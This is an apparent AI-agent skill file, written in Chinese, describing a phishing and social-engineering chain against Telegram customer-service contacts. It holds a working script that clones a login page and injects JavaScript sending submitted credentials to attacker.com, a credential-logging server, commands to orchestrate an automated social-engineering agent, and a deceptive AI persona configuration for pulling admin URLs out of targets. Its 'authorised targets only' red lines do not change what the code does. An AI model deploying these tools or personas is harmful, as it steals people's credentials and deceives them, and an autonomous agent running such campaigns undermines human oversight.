# autonomous-social-engagement — 全文续篇

> 主卡保留前 7 节；本文件从第 8 节起。原文件：`/root/.hermes/skills/security/autonomous-social-engagement/SKILL.md`

## Phase 4: 钓鱼链构造

### 命令 4-1: 钓鱼页面生成（登录克隆）

```python
#!/usr/bin/env python3
"""快速克隆目标登录页为钓鱼页（仅授权目标）"""
import requests, re, sys, os
from urllib.parse import urljoin

TARGET_LOGIN = sys.argv[1] if len(sys.argv) > 1 else "https://example.com/login"
OUTPUT_DIR = sys.argv[2] if len(sys.argv) > 2 else "/tmp/phish_page"
COLLECT_URL = sys.argv[3] if len(sys.argv) > 3 else "https://attacker.com/collect"

os.makedirs(OUTPUT_DIR, exist_ok=True)

s = requests.Session()
s.verify = False
r = s.get(TARGET_LOGIN)

html = r.text

# 替换 form action 为收集服务器
html = re.sub(
    r'(<form[^>]*action=)["\']([^"\']*)["\']',
    f'\\1"{COLLECT_URL}"',
    html
)

# 保持原始 CSS/JS 的绝对路径
for tag in ['href', 'src', 'action']:
    html = re.sub(
        rf'({tag}=")(/[^"]*")',
        lambda m: m.group(1) + urljoin(TARGET_LOGIN, m.group(2).rstrip('"')) + '"',
        html
    )

# 添加凭据收集 JS
collect_js = f"""
<script>
document.querySelectorAll('form').forEach(form => {{
  form.addEventListener('submit', function(e) {{
    e.preventDefault();
    const data = new FormData(form);
    const obj = {{}};
    data.forEach((v, k) => obj[k] = v);
    obj._ts = Date.now();
    obj._ref = document.referrer;
    fetch('{COLLECT_URL}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(obj)
    }}).then(() => {{
      window.location.href = '{TARGET_LOGIN}';
    }});
  }});
}});
</script>
"""
html = html.replace('</body>', collect_js + '</body>')

with open(os.path.join(OUTPUT_DIR, 'index.html'), 'w') as f:
    f.write(html)

print(f"Phishing page saved to {OUTPUT_DIR}/index.html")
print(f"Collect URL: {COLLECT_URL}")
print(f"Original: {TARGET_LOGIN}")
```

### 命令 4-2: 凭据收集服务器

```python
#!/usr/bin/env python3
"""轻量凭据收集服务器（社工钓鱼配套）"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json, datetime, sys, os

LOG_FILE = sys.argv[1] if len(sys.argv) > 1 else "phish_creds.jsonl"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8443

class CollectHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', 'replace')

        entry = {
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "path": self.path,
            "ip": self.client_address[0],
            "ua": self.headers.get('User-Agent', ''),
            "referer": self.headers.get('Referer', ''),
            "body": body[:2000],
        }

        try:
            entry["parsed"] = json.loads(body)
        except:
            pass

        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry, ensure_ascii=False) + '\n')

        print(f"[{entry['timestamp']}] Credential captured from {entry['ip']}")
        if 'parsed' in entry:
            for k, v in entry['parsed'].items():
                if any(kw in k.lower() for kw in ['user','pass','email','phone','token']):
                    print(f"  ⚠️  {k}: {v}")

        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"ok":true}')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def log_message(self, format, *args):
        pass

print(f"Collect server on :{PORT}, logging to {LOG_FILE}")
HTTPServer(('0.0.0.0', PORT), CollectHandler).serve_forever()
```

---

## Phase 5: 完整社工链（信息收集 → 初始访问）

### 流程图

```
┌─────────────────┐
│  Phase 0: OSINT │ ← 从案卷/公开信息提取社工入口
│  TG/邮箱/客服   │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 1: 人设  │ ← 选择话术模板，准备 TG 号
│  构建与准备     │
└────────┬────────┘
         │
┌────────▼────────┐
│  Phase 2: 初始  │ ← 首次联系，建立信任
│  接触           │
└────────┬────────┘
         │ 回复？
    ┌────┴────┐
    │ Yes     │ No → 换号/换入口/升级话术
    │         │
┌───▼───┐    │
│Phase 3│    │
│信息提 │    │
│取     │    │
└───┬───┘    │
    │         │
┌───▼────────▼──┐
│  Phase 4: 目标│ ← 获取后台URL/凭据/注册链接
│  达成/钓鱼    │
└───────┬───────┘
        │
┌───────▼───────┐
│  Phase 5: 接管│ ← 使用凭据登录/注册代理
│  验证         │    交接给 account-takeover-chain
└───────────────┘
```

### 命令 5-1: 完整链编排（断点续跑）

```bash
# 完整社工链编排（状态文件驱动，支持断点续跑）
CASE="<案卷名>"
DOMAIN="<授权域>"
TARGET_TG="@<客服username>"

# Step 1: 情报收集
python3 tools/ops/social_engineer_agent.py recon \
  -d "$DOMAIN" \
  --case "$CASE" \
  --out "exports/bot-recovery/${CASE}/社工/recon.json"

# Step 2: 启动社工（自动模式）
python3 tools/ops/social_engineer_agent.py run \
  -d "$DOMAIN" \
  --target "$TARGET_TG" \
  --goal "agent_url" \
  --persona "代理招商" \
  --state "exports/bot-recovery/${CASE}/社工/state.json" \
  --max-rounds 20 \
  --auto-reply

# Step 3: 如果中断，断点续跑
python3 tools/ops/social_engineer_agent.py resume \
  --state "exports/bot-recovery/${CASE}/社工/state.json"

# Step 4: 提取情报
python3 -c "
import json
state = json.load(open('exports/bot-recovery/${CASE}/社工/state.json'))
print('Status:', state.get('status'))
print('Rounds:', state.get('round_count'))
print('Intel:', json.dumps(state.get('intel', {}), indent=2, ensure_ascii=False))
"
```

---

## Phase 6: AI 自动回复引擎

### 命令 6-1: 配置 AI 自动回复

```python
#!/usr/bin/env python3
"""TG 社工 AI 自动回复配置（基于人设模板）"""
import json, sys

CONFIG = {
    "persona": {
        "name": "阿明",
        "role": "推广者/代理",
        "background": "做过3年线上推广，手上有TG群和FB页面流量",
        "tone": "礼貌、专业、略急切",
        "forbidden_topics": ["政治", "违法", "色情"],
    },
    "goals": [
        {"priority": 1, "goal": "获取代理注册链接", "keywords": ["注册", "register", "链接", "link"]},
        {"priority": 2, "goal": "获取后台登录地址", "keywords": ["后台", "admin", "登录", "login"]},
        {"priority": 3, "goal": "获取技术对接人联系方式", "keywords": ["技术", "对接", "开发"]},
        {"priority": 4, "goal": "了解结算方式和周期", "keywords": ["结算", "分成", "佣金"]},
    ],
    "auto_responses": {
        "greeting": "你好，我是做线上推广的，朋友介绍来了解合作的",
        "ask_register": "好的，注册链接发我一下？我先测试一下后台",
        "ask_backend": "后台是在哪登录的？我看看网址",
        "ask_tech": "你们用的什么系统？我之前对接过类似的",
        "stall": "好的，我研究一下，有问题再问你",
        "thanks": "收到，谢谢！我先去注册看看",
    },
    "escalation": {
        "no_reply_hours": 24,
        "no_reply_action": "send_followup",
        "followup_message": "不好意思又打扰了，上次说的合作方案考虑得怎么样了？",
        "max_followups": 3,
    }
}

output = sys.argv[1] if len(sys.argv) > 1 else "social_config.json"
with open(output, 'w') as f:
    json.dump(CONFIG, f, indent=2, ensure_ascii=False)
print(f"Config saved to {output}")
print("Usage: python3 tools/ops/tg_social_monitor.py run --config {output} ...")
```

---

## 已知局限

1. TG 新号发消息可能被对方设置为「非联系人不可私聊」
2. 部分客服使用 Bot 自动回复，难以绕过预设话术
3. 代理注册可能需要实名认证（身份证/银行卡），不可伪造
4. 社工周期通常需要 1-7 天，非即时产出
5. 频繁换号可能导致 TG 号被风控
6. AI 自动回复在复杂对话中可能露馅

---

## 安全红线

1. **不对非授权目标社工**
2. **不发送真实恶意软件**（钓鱼页仅收集凭据，不下马）
3. **不冒充执法机关/政府**
4. **不威胁/勒索**
5. **社工获取的凭据仅用于授权范围内的验证**
6. **用户说停立刻停**

---

## 产出与落盘

```
exports/bot-recovery/<案卷>/
├── STATUS.md                        # 含社工进度
├── 社工/
│   ├── recon.json                   # 情报收集结果
│   ├── state.json                   # 社工代理状态（断点续跑）
│   ├── tg_log.jsonl                 # TG 对话记录
│   ├── tg_watch.jsonl               # TG 监控记录
│   ├── intel_extract.json           # 从对话中提取的情报
│   ├── social_config.json           # AI 自动回复配置
│   ├── phish_page/                  # 钓鱼页面（如使用）
│   └── creds_collected.jsonl        # 收集到的凭据
└── REPORT.md
```

---

## 真源

- 工具: `tools/ops/social_engineer_agent.py` / `tools/ops/tg_social_monitor.py`
- Playbook: `docs/playbooks/TG号库投递与社工推进手法.md`
- Playbook: `docs/playbooks/博彩站代理社工+后台接管杀伤链.md`
- 扩展: `docs/learning/extended-pack/skills/autonomous-social-engagement/SKILL.md`
- 号库: `exports/bot-recovery/_tg_accounts/`
- 分级: `docs/playbooks/案卷Triage与手法索引.md`

